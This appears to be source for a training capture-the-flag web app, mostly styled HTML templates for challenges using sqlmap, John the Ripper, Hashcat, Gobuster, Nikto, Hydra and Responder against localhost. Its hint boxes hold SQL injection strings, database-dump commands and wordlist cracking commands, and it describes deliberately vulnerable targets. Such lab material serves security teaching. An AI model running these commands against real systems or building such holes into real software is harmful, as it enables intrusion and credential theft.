...
def index():
    ...
    <head>
        ...
        <style>
            ...
            * { box-sizing: border-box; margin: 0; padding: 0; }
            ...
            .header {
                background: linear-gradient(135deg, #1a002e 0%, #0d1b2a 50%, #2e001a 100%);
            ...
            @keyframes glitch {
                0%, 100% { transform: translate(0); text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
                2% { transform: translate(-3px, 2px); text-shadow: -3px 0 #00ffff, 3px 0 #ff0000; }
                4% { transform: translate(3px, -2px); text-shadow: 3px 0 #00ffff, -3px 0 #ff0000; }
                6% { transform: translate(0); text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
                50% { text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
                52% { transform: translate(-2px, 1px); text-shadow: -2px 0 #00ffff, 2px 0 #ff0000; }
                54% { transform: translate(0); text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
            }
            .header p { color: #00ffff; margin-top: 15px; font-size: 1.1em; text-shadow: 0 0 10px #00ffff; letter-spacing: 2px; }
            .nav {
                display: flex; justify-content: center; gap: 20px;
                padding: 20px; background: rgba(10,10,15,0.95);
                border-bottom: 2px solid #333; position: relative; z-index: 3;
            }
            .nav a {
                color: #00ffff; font-family: 'Orbitron', sans-serif;
                font-size: 0.95em; text-decoration: none;
                padding: 12px 24px; border: 2px solid #00ffff;
                border-radius: 8px; transition: all 0.3s;
                text-shadow: 0 0 5px #00ffff;
            }
            .nav a:hover { background: #00ffff; color: #0a0a0f; box-shadow: 0 0 30px #00ffff; transform: scale(1.05); }
            .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; position: relative; z-index: 3; }
            .flash-success {
                ...
                font-size: 1.3em; color: #00ff00;
                box-shadow: 0 0 30px rgba(0,255,0,0.3);
                animation: pulse-glow 2s ease-in-out infinite;
            }
            @keyframes pulse-glow { 0%, 100% { box-shadow: 0 0 30px rgba(0,255,0,0.3); } 50% { box-shadow: 0 0 50px rgba(0,255,0,0.5); } }
            .flash-error {
                background: linear-gradient(135deg, #2e0a0a, #1a0a2e);
                border: 2px solid #ff0000; border-radius: 12px;
                padding: 25px; margin: 20px 0; text-align: center;
                font-size: 1.3em; color: #ff0000;
                box-shadow: 0 0 30px rgba(255,0,0,0.3);
            }
            .flash-points { color: #ffff00; font-weight: bold; text-shadow: 0 0 8px #ffff00; }
            .warning {
                background: linear-gradient(135deg, #2e1a00, #1a0a2e);
                border: 2px solid #ffff00; border-radius: 12px;
                padding: 20px; margin: 20px 0; text-align: center;
                color: #ffff00; box-shadow: 0 0 20px rgba(255,255,0,0.2);
            }
            .player-bar {
            ...
            .player-bar span { margin: 0 15px; font-size: 1.05em; }
            .player-name { color: #ff00ff; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 8px #ff00ff; }
            .player-score { color: #ffff00; font-size: 1.3em; text-shadow: 0 0 8px #ffff00; }
            .reset-btn {
            ...
            .reset-btn:hover { box-shadow: 0 0 30px #ff0000; transform: scale(1.05); }
            .stats-bar {
            ...
            .tool-card:hover { border-color: #ff00ff; box-shadow: 0 0 25px rgba(255,0,255,0.3); transform: translateY(-3px); }
            .tool-card.completed { opacity: 0.6; border-color: #333; }
            .tool-card.completed:hover { transform: none; box-shadow: none; }
            .tool-icon { font-size: 2.5em; margin-bottom: 10px; }
            .tool-name { font-family: 'Orbitron', sans-serif; font-size: 1.1em; color: #00ffff; margin-bottom: 8px; text-shadow: 0 0 5px #00ffff; }
            .tool-desc { color: #888; font-size: 0.9em; margin-bottom: 12px; line-height: 1.5; }
            .tool-points { color: #ffff00; font-weight: bold; text-shadow: 0 0 5px #ffff00; margin-bottom: 15px; }
            .btn {
            ...
            .btn:hover { box-shadow: 0 0 30px #ff00ff; transform: scale(1.05); }
            .btn-completed {
    ...
    <body>
        ...
        <div class="header">
            <h1>CYBERDEMON CTF</h1>
            <p>// Master 15 Security Tools &bull; Find Hidden Flags &bull; No Cheating //</p>
        </div>
        ...
        <div class="container">
            {% if flash_message %}
            <div class="{% if flash_type == 'success' %}flash-success{% else %}flash-error{% endif %}">
                {% if flash_type == 'success' %}
                GOOD JOB! {{ flash_message }}
                {% if flash_points %}<span class="flash-points">+{{ flash_points }} pts</span>{% endif %}
                {% else %}
                {{ flash_message }}
                {% endif %}
            </div>
            ...
            <div class="warning">
                Flags are hidden throughout the lab. You must use each tool to find its flag. There is NO /debug endpoint!
            </div>
            
            {% if 'username' in session %}
            <div class="player-bar">
                <div>
                    <span>Player: <span class="player-name">{{ session.username }}</span></span>
                    <span>Score: <span class="player-score">{{ total_score }}</span> / 245 pts</span>
                    <span>Solved: <strong>{{ solved|length }}</strong> / 15</span>
                </div>
                <div>
                    {% if is_admin %}
                    <a href="/ctf/reset" onclick="return confirm('Are you sure? This will save all data to JSON and reset the CTF!')" class="reset-btn">RESET CTF</a>
                    {% endif %}
                </div>
            </div>
            {% endif %}
            ...
            <div class="stats-bar">
                <div class="stat-item"><span class="stat-value">15</span><span class="stat-label">Total Tools</span></div>
                <div class="stat-item"><span class="stat-value">15</span><span class="stat-label">Total Flags</span></div>
                <div class="stat-item"><span class="stat-value">245</span><span class="stat-label">Total Points</span></div>
            </div>
...
def ctf_login():
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - Login</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            ...
            .login-box {
                ...
                box-shadow: 0 0 40px rgba(255,0,255,0.4), inset 0 0 50px rgba(255,0,255,0.05);
                position: relative; z-index: 3;
            }
            .login-box::before {
                content: '';
            ...
            input {
                ...
                font-size: 1em; outline: none; transition: all 0.3s;
            }
            input:focus { border-color: #00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.3); }
            ...
            .btn-login:hover { box-shadow: 0 0 40px rgba(0,255,255,0.6); transform: scale(1.02); }
            .btn-register {
                background: linear-gradient(135deg, #ff00ff, #ff0066);
                color: #fff;
                box-shadow: 0 0 20px rgba(255,0,255,0.4);
            }
            .btn-register:hover { box-shadow: 0 0 40px rgba(255,0,255,0.6); transform: scale(1.02); }
            .links { text-align: center; margin-top: 25px; }
            .links a {
                color: #888; text-decoration: none;
                font-size: 0.9em; transition: all 0.3s;
            }
            .links a:hover { color: #00ffff; text-shadow: 0 0 10px #00ffff; }
        </style>
    </head>
    <body>
        <div class="scanline"></div>
        <div class="login-box">
            <h2>CYBERDEMON CTF</h2>
            <form method="POST">
...
def tool_challenge(tool_name):
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - {{ tool.name }}</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
            ...
            .header {
                background: linear-gradient(135deg, #1a002e, #0d1b2a, #2e001a);
            ...
            .header p { color: #00ffff; margin-top: 10px; font-size: 1em; text-shadow: 0 0 5px #00ffff; }
            .nav {
                display: flex; justify-content: center; gap: 15px;
                padding: 18px; background: rgba(10,10,15,0.95);
                border-bottom: 2px solid #333; position: relative; z-index: 3;
            }
            .nav a {
            ...
            .nav a:hover { border-color: #00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.2); }
            .container { max-width: 1000px; margin: 0 auto; padding: 30px 20px; position: relative; z-index: 3; }
            .section {
                background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
                border: 2px solid #333; border-radius: 15px;
                padding: 28px; margin: 25px 0;
            }
            .section h2 {
                font-family: 'Orbitron', sans-serif;
                color: #00ffff; font-size: 1.2em;
                text-shadow: 0 0 8px #00ffff;
                border-bottom: 1px solid #333;
                padding-bottom: 12px; margin-bottom: 18px;
            }
            .learn pre {
                background: #050508; padding: 18px;
                overflow-x: auto; border: 1px solid #333;
                border-radius: 10px; font-size: 0.9em;
                color: #00ff00; line-height: 1.6;
            }
            .task {
                background: linear-gradient(135deg, #0a2e1a 0%, #1a0a2e 100%);
                border: 2px solid #00ff00;
            }
            .task h2 { color: #00ff00; text-shadow: 0 0 8px #00ff00; }
            .task-link {
                margin-top: 18px; padding: 18px;
                background: rgba(10,10,15,0.8);
                border: 1px solid #00ff00; border-radius: 10px;
            }
            .task-link strong { color: #00ff00; }
            .task-link a {
                color: #00ffff; font-size: 1.1em; text-decoration: none;
                border-bottom: 2px solid #00ffff; margin-top: 8px; display: inline-block;
                transition: all 0.3s;
            }
            .task-link a:hover { text-shadow: 0 0 10px #00ffff; }
            .hint-box {
                background: linear-gradient(135deg, #2e1a00, #1a0a2e);
                border: 2px solid #ffff00; border-radius: 10px;
            ...
            .flag-form input[type="text"]:focus { border-color: #00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.3); }
            .flag-form button {
                padding: 14px 28px;
                background: linear-gradient(135deg, #ff00ff, #ff0066);
            ...
            .flag-form button:hover { box-shadow: 0 0 30px rgba(255,0,255,0.5); transform: scale(1.02); }
            .message { padding: 15px; margin: 15px 0; text-align: center; border-radius: 10px; }
            .success { background: linear-gradient(135deg, #0a2e1a, #0d1b2a); border: 2px solid #00ff00; color: #00ff00; }
            .error { background: linear-gradient(135deg, #2e0a0a, #1a0a2e); border: 2px solid #ff0000; color: #ff0000; }
            details { cursor: pointer; }
            summary {
                font-family: 'Orbitron', sans-serif;
                color: #ffff00; padding: 10px 0; font-size: 0.95em;
            }
            details summary:hover { text-shadow: 0 0 10px #ffff00; }
            .packet-box {
                margin-top: 18px; padding: 20px;
                background: rgba(10,10,15,0.8);
                border: 1px solid #00ff00; border-radius: 10px;
            }
            .packet-box strong { color: #00ff00; }
            .packet-box code {
                background: #050508; padding: 5px 10px;
                display: block; margin: 12px 0;
                border-radius: 5px; color: #00ff00;
            ...
            .action-btn.orange { background: linear-gradient(135deg, #ff6600, #ff0066); color: #fff; box-shadow: 0 0 15px rgba(255,102,0,0.3); }
            .action-btn.red { background: linear-gradient(135deg, #ff0000, #ff0066); color: #fff; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
            .action-btn:hover { transform: scale(1.05); }
            #packet-status { margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="scanline"></div>
        ...
        <div class="container">
            ...
            <div class="section task">
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/burpsuite/login">Open Burp Suite Login Page</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    <strong>Target Login Page:</strong><br>
                    <a href="/ctf/tool/nikto/login">Open Nikto Target Login</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/gobuster">Open Gobuster Target</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/sqlmap">Open SQLmap Target</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/john">Open John Challenge</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/hashcat">Open Hashcat Challenge</a>
                </div>
                {% endif %}
                ...
                <div class="task-link">
                    ...
                    <a href="/ctf/tool/hydra">Open Hydra Challenge</a>
                </div>
                {% endif %}
                ...
                <div class="packet-box">
                    ...
                    <p style="margin-bottom: 12px;">Start Wireshark capture first, then click the button to send packets:</p>
                    <code>sudo wireshark -i any -f "tcp port 5000"</code>
                    <button onclick="sendPackets()" class="action-btn orange">
                        SEND PACKET REQUEST
                    </button>
                    <div id="packet-status" style="display: none;"></div>
                    <script>
                ...
                <div class="packet-box">
                    ...
                    <button onclick="window.location='/ctf/tool/responder/ntlm'" class="action-btn orange">
                        SEND NTLM AUTH
                    </button>
                    <button onclick="window.location='/ctf/tool/responder/trigger'" class="action-btn red">
                        TRIGGER SMB TRAFFIC
                    </button>
                    <p style="color: #888; font-size: 0.9em; margin-top: 15px;">The flag is hidden in the NTLM hash - decode the Base64 to reveal it!</p>
                </div>
                {% endif %}
...
def burpsuite_login():
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - Burp Suite</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
            ...
            h2 {
                font-family: 'Orbitron', sans-serif;
                color: #00ffff; font-size: 1.6em;
                text-shadow: 0 0 15px #00ffff;
                text-align: center; margin-bottom: 30px;
                letter-spacing: 2px;
            }
            .form-group { margin-bottom: 18px; }
            label { display: block; margin-bottom: 6px; color: #888; font-size: 0.95em; }
            input {
                width: 100%; padding: 14px 18px;
                background: rgba(10,10,15,0.8);
                border: 2px solid #333; border-radius: 8px;
            ...
            button[type="submit"]:hover { box-shadow: 0 0 40px rgba(255,0,255,0.6); transform: scale(1.02); }
            .message {
            ...
            .hint {
                background: linear-gradient(135deg, #2e1a00, #1a0a2e);
                border: 2px solid #ffff00; border-radius: 12px;
                padding: 18px; margin-top: 25px;
                font-size: 0.9em; color: #ffff00;
                box-shadow: 0 0 15px rgba(255,255,0,0.15);
            }
            .hint code {
                background: rgba(10,10,15,0.8); padding: 2px 8px;
                border-radius: 4px; color: #00ffff;
                border: 1px solid #00ffff;
            }
            .nav { text-align: center; margin-top: 25px; }
            .nav a {
                color: #ff00ff; margin: 0 15px; text-decoration: none;
                font-family: 'Orbitron', sans-serif; font-size: 0.85em;
                transition: all 0.3s;
            }
    ...
    <body>
        ...
        <div class="login-box">
            ...
            <div class="hint">
                <strong>Burp Suite Challenge:</strong><br><br>
...
def nikto_login():
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - Nikto Target</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
            ...
            input {
                ...
                background: rgba(10,10,15,0.8);
                border: 2px solid #333; border-radius: 8px;
                color: #ff6666; font-family: 'Share Tech Mono', monospace;
                font-size: 1em; outline: none; transition: all 0.3s;
            }
            input:focus { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
            input::placeholder { color: #555; }
            button[type="submit"] {
                width: 100%; padding: 16px;
                background: linear-gradient(135deg, #ff0000, #ff0066);
                color: #fff; border: none; border-radius: 8px;
                font-family: 'Orbitron', sans-serif;
                font-size: 1em; font-weight: bold;
                cursor: pointer; transition: all 0.3s;
            ...
            button[type="submit"]:hover { box-shadow: 0 0 40px rgba(255,0,0,0.6); transform: scale(1.02); }
            .message { padding: 15px; margin: 20px 0; text-align: center; border-radius: 10px; }
            .success { background: linear-gradient(135deg, #0a2e1a, #0d1b2a); border: 2px solid #00ff00; color: #00ff00; }
            .error { background: linear-gradient(135deg, #2e0a0a, #1a0a2e); border: 2px solid #ff0000; color: #ff0000; }
            .hint {
                background: linear-gradient(135deg, #2e1a00, #1a0a2e);
    ...
    <body>
        ...
        <div class="login-box">
            ...
            <div class="hint">
                <strong>Nikto Challenge:</strong><br><br>
                1. Run: <code>nikto -h http://localhost:5000/ctf/tool/nikto/login</code><br>
                2. Nikto will find: backup files, server info leaks<br>
                3. Check for /ctf/tool/nikto/backup.sql<br>
...
<html>
<head>
    <title>CYBERDEMON CTF - Gobuster</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        .info h2 {
            font-family: 'Orbitron', sans-serif;
            color: #00ffff; font-size: 1.3em;
            text-shadow: 0 0 10px #00ffff; margin-bottom: 15px;
        }
        .info p { line-height: 1.7; color: #aaa; }
        .code-block {
            background: #050508;
            border: 1px solid #00ff00;
            border-radius: 12px; padding: 22px;
            font-size: 1.05em; color: #00ff00;
        ...
        .hint {
            background: linear-gradient(135deg, #2e1a00, #1a0a2e);
            border: 2px solid #ffff00; border-radius: 15px;
            padding: 22px; margin: 25px 0;
            color: #ffff00; box-shadow: 0 0 20px rgba(255,255,0,0.15);
        }
        .hint strong { text-shadow: 0 0 8px #ffff00; }
        .nav { text-align: center; margin-top: 40px; padding-top: 30px; border-top: 2px solid #333; }
        .nav a {
            color: #ff00ff; margin: 0 20px; text-decoration: none;
            font-family: 'Orbitron', sans-serif; font-size: 1em;
            padding: 12px 28px; border: 2px solid #ff00ff; border-radius: 8px;
            transition: all 0.3s;
        }
        .nav a:hover { background: #ff00ff; color: #0a0a0f; box-shadow: 0 0 30px #ff00ff; }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>GOBUSTER</h1>
        <div class="subtitle">// Directory Discovery Challenge //</div>
        
        <div class="info">
            <h2>What is Gobuster?</h2>
            <p>Gobuster is a directory/file brute-forcing tool used to discover hidden paths on web servers. It uses wordlists to enumerate directories, files, DNS subdomains, and virtual hosts.</p>
        </div>
        
        <div class="info">
            <h2>Challenge</h2>
            <p>Use Gobuster to discover hidden directories on this server. The flag is hidden in one of the discovered directories!</p>
        </div>
        
        <div class="code-block">gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt

# With extensions:
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x txt,html,php</div>
...
<html>
<head>
    <title>CYBERDEMON CTF - SQLmap</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        .subtitle { text-align: center; color: #888; margin-bottom: 40px; font-size: 1.1em; }
        .target-box {
            background: linear-gradient(135deg, #2e0a1a 0%, #1a0a2e 100%);
            border: 2px solid #ff0066; border-radius: 15px;
            padding: 28px; margin: 25px 0; text-align: center;
            box-shadow: 0 0 30px rgba(255,0,102,0.3);
        }
        .target-box h2 {
            font-family: 'Orbitron', sans-serif;
            color: #ff0066; font-size: 1.3em;
            text-shadow: 0 0 10px #ff0066; margin-bottom: 15px;
        }
        .target-box a {
            color: #00ffff; font-size: 1.1em; text-decoration: none;
            border-bottom: 2px solid #00ffff; transition: all 0.3s;
        }
        .target-box a:hover { text-shadow: 0 0 10px #00ffff; }
        .info {
            background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
            border: 2px solid #00ffff; border-radius: 15px;
            padding: 28px; margin: 25px 0;
...
<body>
    ...
    <div class="container">
        <h1>SQLMAP</h1>
        <div class="subtitle">// SQL Injection Challenge //</div>
        
        <div class="target-box">
            <h2>Target Login Page</h2>
            <a href="/ctf/tool/sqlmap/login">Open SQLmap Target Login</a>
        </div>
        
        <div class="info">
            <h2>What is SQLmap?</h2>
            <p>SQLmap is an automated SQL injection and database takeover tool. It supports a wide range of database engines and can detect and exploit SQL injection vulnerabilities automatically.</p>
        </div>
        
        <div class="info">
            <h2>Challenge</h2>
            <p>Use SQLmap to exploit SQL injection vulnerabilities and dump the database. Find the flag hidden in the database!</p>
        </div>
        
        <div class="code-block">sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" --dbs

sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" -D vulnerable --tables

sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" -D vulnerable -T flag --dump</div>
...
<html>
<head>
    <title>CYBERDEMON CTF - SQLmap Target</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        input:focus { border-color: #ff0066; box-shadow: 0 0 15px rgba(255,0,102,0.3); }
        input::placeholder { color: #555; }
        button[type="submit"] {
            width: 100%; padding: 16px;
        ...
        button[type="submit"]:hover { box-shadow: 0 0 40px rgba(255,0,102,0.6); transform: scale(1.02); }
        .message { padding: 15px; margin: 20px 0; text-align: center; border-radius: 10px; }
        .success { background: linear-gradient(135deg, #0a2e1a, #0d1b2a); border: 2px solid #00ff00; color: #00ff00; }
        .error { background: linear-gradient(135deg, #2e0a0a, #1a0a2e); border: 2px solid #ff0000; color: #ff0000; }
        .hint {
        ...
        .hint code {
            background: rgba(10,10,15,0.8); padding: 2px 8px;
            border-radius: 4px; color: #00ffff;
            border: 1px solid #00ffff; font-size: 0.9em;
        }
        .nav { text-align: center; margin-top: 25px; }
        .nav a {
            color: #ff00ff; margin: 0 15px; text-decoration: none;
...
<body>
    ...
    <div class="login-box">
        ...
        <div class="hint">
            <strong>SQLmap Challenge:</strong><br><br>
            1. <code>sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/login" --data="username=admin&password=test" --dbs</code><br>
...
<html>
<head>
    <title>CYBERDEMON CTF - SQLmap Search</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        input[type="text"]:focus { border-color: #ff0066; box-shadow: 0 0 15px rgba(255,0,102,0.3); }
        ...
        button:hover { box-shadow: 0 0 30px rgba(255,0,102,0.5); transform: scale(1.02); }
        .code-block {
            background: #050508;
            border: 1px solid #00ff00;
            border-radius: 12px; padding: 22px;
            font-size: 1.05em; color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
            white-space: pre-wrap; margin: 25px 0;
            box-shadow: 0 0 15px rgba(0,255,0,0.15);
        }
        .code-block::before {
            content: 'root@cyberdemons:~# ';
        ...
        table { width: 100%; border-collapse: separate; border-spacing: 0 6px; margin: 25px 0; }
        th {
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(135deg, #ff00ff, #ff0066);
        ...
        td:first-child { border-left: 2px solid #333; border-radius: 8px 0 0 8px; }
        td:last-child { border-right: 2px solid #333; border-radius: 0 8px 8px 0; }
        .nav { text-align: center; margin-top: 35px; padding-top: 25px; border-top: 2px solid #333; }
        .nav a {
            color: #ff00ff; margin: 0 20px; text-decoration: none;
...
<body>
    ...
    <div class="container">
        ...
        <div class="code-block">sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/search?username=admin' OR '1'='1" --dbs

sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/search?username=admin' UNION SELECT null,null,null--" --dump</div>
        
        <h2 style="font-family: Orbitron, sans-serif; color: #00ffff; text-shadow: 0 0 10px #00ffff; margin-bottom: 15px; letter-spacing: 2px;">RESULTS:</h2>
        <table>
...
<html>
<head>
    <title>CYBERDEMON CTF - John the Ripper</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        .download-box h3 {
            font-family: 'Orbitron', sans-serif;
            color: #ffff00; font-size: 1.2em;
            text-shadow: 0 0 10px #ffff00; margin-bottom: 15px;
        }
        .download-box a {
            color: #00ff00; font-size: 1.1em; text-decoration: none;
            padding: 10px 24px; border: 2px solid #00ff00; border-radius: 8px;
            margin: 8px; display: inline-block; transition: all 0.3s;
        }
        .download-box a:hover { background: #00ff00; color: #0a0a0f; box-shadow: 0 0 20px #00ff00; }
        .info {
            background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
            border: 2px solid #00ffff; border-radius: 15px;
            padding: 28px; margin: 25px 0;
        ...
        .step h3 {
            ...
            text-shadow: 0 0 8px #ffff00; margin-bottom: 12px;
        }
        .step p { color: #aaa; margin-bottom: 10px; }
        .step a { color: #00ffff; text-decoration: none; border-bottom: 1px solid #00ffff; }
        .code-block {
            background: #050508;
            border: 1px solid #00ff00;
            border-radius: 12px; padding: 22px;
...
<body>
    ...
    <div class="container">
        ...
        <div class="subtitle">// Password Cracking Challenge //</div>
        
        <div class="download-box">
            <h3>Download Hash Files</h3>
            <a href="/ctf/tool/john/hash.txt" download>hash.txt</a>
            <a href="/ctf/tool/john/shadow.txt" download>shadow.txt</a>
        </div>
        
        <div class="info">
            <h2>What is John the Ripper?</h2>
            <p>John the Ripper is a password cracking tool that uses dictionary and brute-force attacks to crack password hashes. It supports many hash types and is one of the most popular password auditing tools.</p>
        </div>
        ...
        <div class="step">
            ...
            <div class="code-block">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 3: View cracked passwords</h3>
            <div class="code-block">john --show --format=raw-md5 hash.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 4: Get the flag!</h3>
            <p>After cracking, fetch the flag from the server:</p>
            <div class="code-block">curl http://localhost:5000/ctf/tool/john/flag.txt</div>
            <p style="margin-top: 10px;"><strong>Or click here:</strong> <a href="/ctf/tool/john/flag.txt">Get Flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Quick Commands:</strong><br><br>
            <code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code><br><br>
            <code>john --show --format=raw-md5 hash.txt</code><br><br>
...
<html>
<head>
    <title>CYBERDEMON CTF - Hashcat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
...
<body>
    ...
    <div class="container">
        <h1>HASHCAT</h1>
        <div class="subtitle">// GPU Password Cracking Challenge //</div>
        
        <div class="download-box">
            <h3>Download Hash Files</h3>
            <a href="/ctf/tool/hashcat/hashes.txt" download>hashes.txt</a>
            <a href="/ctf/tool/hashcat/md5_hashes.txt" download>md5_hashes.txt</a>
        </div>
        
        <div class="info">
            <h2>What is Hashcat?</h2>
            <p>Hashcat is a GPU-accelerated password cracking tool that supports many hash types. It can crack MD5, SHA1, NTLM, bcrypt, and hundreds of other hash algorithms at incredible speed.</p>
        </div>
        ...
        <div class="step">
            ...
            <div class="code-block">Hash type 0 = MD5
Hash type 1000 = NTLM
Hash type 3200 = bcrypt</div>
        ...
        <div class="step">
            ...
            <div class="code-block">hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 4: View cracked passwords</h3>
            <div class="code-block">hashcat -m 0 hashes.txt --show</div>
        </div>
        
        <div class="step">
            <h3>Step 5: Get the flag!</h3>
            <p>After cracking, fetch the flag from the server:</p>
            <div class="code-block">curl http://localhost:5000/ctf/tool/hashcat/flag.txt</div>
            <p style="margin-top: 10px;"><strong>Or click here:</strong> <a href="/ctf/tool/hashcat/flag.txt">Get Flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Quick Commands:</strong><br><br>
            <code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code><br><br>
            <code>hashcat -m 0 hashes.txt --show</code><br><br>
            <code>curl http://localhost:5000/ctf/tool/hashcat/flag.txt</code>
        </div>
        
        <div class="hint">
            <strong>Hash Types:</strong><br><br>
            -m 0 = MD5<br>
            -m 100 = SHA1<br>
            -m 1000 = NTLM<br>
...
<html>
<head>
    <title>CYBERDEMON RAID DOMAIN</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
        ...
        @keyframes glitch {
            0%, 100% { transform: translate(0); text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
            2% { transform: translate(-3px, 2px); text-shadow: -3px 0 #00ffff, 3px 0 #ff00ff; }
            4% { transform: translate(3px, -2px); text-shadow: 3px 0 #00ffff, -3px 0 #ff00ff; }
            6% { transform: translate(0); text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
            50% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
            52% { transform: translate(-2px, 1px); text-shadow: -2px 0 #00ffff, 2px 0 #ff00ff; }
            54% { transform: translate(0); text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
        }
        .subtitle { text-align: center; color: #00ffff; font-size: 1.3em; margin-bottom: 40px; text-shadow: 0 0 10px #00ffff; animation: pulse 2s ease-in-out infinite; letter-spacing: 3px; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        .divider { height: 2px; background: linear-gradient(90deg, transparent, #ff0000, #00ffff, #ff0000, transparent); margin: 30px 0; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
        .target {
            background: linear-gradient(135deg, #1a0a0a 0%, #0d1b2a 100%);
            border: 2px solid #ff0000;
            border-radius: 15px; padding: 30px; margin: 30px 0; text-align: center;
            box-shadow: 0 0 30px rgba(255,0,0,0.4), inset 0 0 40px rgba(255,0,0,0.1);
            position: relative; overflow: hidden;
        }
        .target::before {
            content: '';
            ...
            background: conic-gradient(from 0deg, transparent, #ff0000, transparent, #00ffff, transparent);
            animation: rotate 6s linear infinite;
            opacity: 0.05;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        .target h2 { font-family: 'Orbitron', sans-serif; color: #ff0000; font-size: 1.8em; text-shadow: 0 0 20px #ff0000; margin-bottom: 20px; position: relative; }
        .target p { font-size: 1.1em; margin: 10px 0; position: relative; }
        .target strong { color: #ffff00; text-shadow: 0 0 8px #ffff00; }
        .info {
            background: linear-gradient(135deg, #0a1a2e 0%, #1a0a2e 100%);
            border: 2px solid #00ffff;
        ...
        .info h2 { font-family: 'Orbitron', sans-serif; color: #00ffff; font-size: 1.5em; text-shadow: 0 0 15px #00ffff; margin-bottom: 15px; }
        .step {
            background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
            border: 2px solid #ffff00;
